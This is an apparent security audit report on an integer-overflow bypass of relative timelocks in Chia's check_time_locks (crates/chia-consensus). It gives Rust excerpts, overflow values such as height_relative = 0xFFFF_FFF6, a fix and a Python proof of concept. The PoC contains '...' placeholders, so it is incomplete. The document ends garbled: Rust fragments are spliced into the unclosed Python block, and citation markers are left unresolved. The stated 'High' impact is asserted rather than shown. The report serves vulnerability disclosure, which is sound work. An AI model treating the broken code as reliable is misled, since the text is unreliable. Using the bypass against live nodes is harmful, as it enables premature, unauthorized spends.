### Title
Integer Overflow in Relative Timelock Arithmetic Bypasses `ASSERT_HEIGHT_RELATIVE` / `ASSERT_SECONDS_RELATIVE` Enforcement — (File: `crates/chia-consensus/src/check_time_locks.rs`)

---

### Summary

When `check_time_locks` is invoked with `nowrap=false` (the legacy pre-softfork code path), relative timelock comparisons use `wrapping_add` instead of `saturating_add`. A crafted spend carrying a near-maximum `height_relative` or `seconds_relative` value causes the computed threshold to wrap around to a small integer, making the guard comparison trivially false and silently passing the timelock check — even though the required block height or timestamp has not been reached.

---

### Finding Description

`check_time_locks` in `crates/chia-consensus/src/check_time_locks.rs` enforces four relative timelock conditions. For each, the code branches on the `nowrap` flag:

```rust
// lines 55-68
if let Some(height_relative) = spend.height_relative {
    if nowrap {
        if prev_transaction_block_height
            < unspent.confirmed_block_index.saturating_add(height_relative)
        {
            return Err(ValidationErr::Err(ErrorCode::AssertHeightRelativeFailed));
        }
    } else if prev_transaction_block_height
        < unspent.confirmed_block_index.wrapping_add(height_relative)  // ← overflow path
    {
        return Err(ValidationErr::Err(ErrorCode::AssertHeightRelativeFailed));
    }
}
``` [1](#0-0) 

The same pattern applies to `seconds_relative` (lines 70–78): [2](#0-1) 

**Overflow scenario for `ASSERT_HEIGHT_RELATIVE`:**

- Coin confirmed at block `10`.
- Attacker sets `height_relative = 0xFFFF_FFF6` (u32).
- `wrapping_add(10, 0xFFFF_FFF6) = 0` (wraps mod 2³²).
- Guard: `prev_height < 0` → always `false` → **no error returned**.
- The spend is accepted at any block height, despite the timelock demanding ~4 billion more blocks.

**Overflow scenario for `ASSERT_SECONDS_RELATIVE`:**

- Coin timestamp `10000`.
- Attacker sets `seconds_relative = 0xFFFF_FFFF_FFFF_D8F0` (u64).
- `wrapping_add(10000, 0xFFFF_FFFF_FFFF_D8F0) = 0` (wraps mod 2⁶⁴).
- Guard: `timestamp < 0` → always `false` → **no error returned**.

Both cases are explicitly confirmed by the codebase's own test vectors:

```
// 10 + (2^32 - 10) overflows to 0, wrapping: 15 < 0 -> Ok
// saturating: clamps to u32::MAX, 15 < u32::MAX -> Err
(make_test_conds(height_relative=0xFFFF_FFF6), 13, None),
``` [3](#0-2) 

`None` in the `expected_wrap` column means the function returns no error — the timelock is silently bypassed.

The same wrapping divergence exists for `before_height_relative` and `before_seconds_relative` (lines 79–112), but in the opposite direction: wrapping causes a `BEFORE` constraint to fire erroneously, which is a denial-of-spend rather than a bypass. [4](#0-3) 

---

### Impact Explanation

A coin whose puzzle emits `ASSERT_HEIGHT_RELATIVE` or `ASSERT_SECONDS_RELATIVE` with a carefully chosen large value will have its timelock silently ignored on any node that calls `check_time_locks` with `nowrap=false`. The coin can be spent immediately — before the intended maturity height or timestamp — enabling unauthorized spend acceptance. This matches the **High** impact category: *timelock condition validation bypass enables unauthorized spend acceptance*.

---

### Likelihood Explanation

The `nowrap` parameter is caller-controlled at the Python boundary via `py_check_time_locks`: [5](#0-4) 

The Python full node passes this flag based on its own fork-height logic. Any node operating in the `nowrap=false` (pre-softfork) regime — or any caller that passes `False` — is vulnerable. The attacker only needs to submit a spend bundle with a crafted large relative timelock value; no privileged access, key material, or network position is required. The exact values needed to trigger the overflow are deterministic and trivially computable from the coin's `confirmed_block_index` or `timestamp`.

---

### Recommendation

Replace `wrapping_add` with `saturating_add` unconditionally for all relative timelock threshold computations, or remove the `nowrap=false` branch entirely if the legacy wrapping behavior is no longer required by any active consensus rule. The `nowrap=true` (saturating) path already produces correct, safe behavior:

```rust
// Safe: saturating_add prevents overflow
if prev_transaction_block_height
    < unspent.confirmed_block_index.saturating_add(height_relative)
```

If the `nowrap=false` path must be preserved for historical block replay, add an explicit overflow check and treat overflow as "timelock not yet satisfied" (i.e., return `AssertHeightRelativeFailed`).

---

### Proof of Concept

Using the existing test harness (values taken directly from the codebase's own test vectors):

```python
from chia_rs import check_time_locks, SpendBundleConditions, SpendConditions, CoinRecord, Coin
from chia_rs.sized_bytes import bytes32
from chia_rs.sized_ints import uint32, uint64

puzzle_hash = bytes32(b'\x00' * 32)
coin = Coin(puzzle_hash, puzzle_hash, uint64(1_000_000_000))
coin_id = coin.name()

# Coin confirmed at block 10
coin_record = CoinRecord(coin, uint32(10), uint32(0), False, uint64(10000))

# Craft height_relative that wraps: 10 + 0xFFFF_FFF6 = 0 (mod 2^32)
spend = SpendConditions(
    coin_id=coin_id,
    height_relative=uint32(0xFFFF_FFF6),
    ...
)
bundle = SpendBundleConditions(spends=[spend], ...)

# With nowrap=True (safe): returns error code 13 (AssertHeightRelativeFailed)
result_safe = check_time_locks({coin_id: coin_record}, bundle, uint32(15), uint64(10150), True)
assert result_safe == 13

# With nowrap=False (vulnerable): returns None — timelock bypassed!
result_vuln = check_time_locks({coin_id: coin_record}, bundle, uint32(15), uint64(10150), False)
assert result_vuln is None  # spend accepted despite timelock not satisfied

    prev_transaction_block_height: u32,
    timestamp: u64,
    nowrap: bool,
) -> PyResult<Option<u32>> {

        &removal_coin_records,
        bundle_conds,
        prev_transaction_block_height,
        timestamp,
        nowrap,
    );

    match res {
        Ok(()) => Ok(None),
        Err(ec) => Ok(Some(ec.error_code().into())),
    }
}
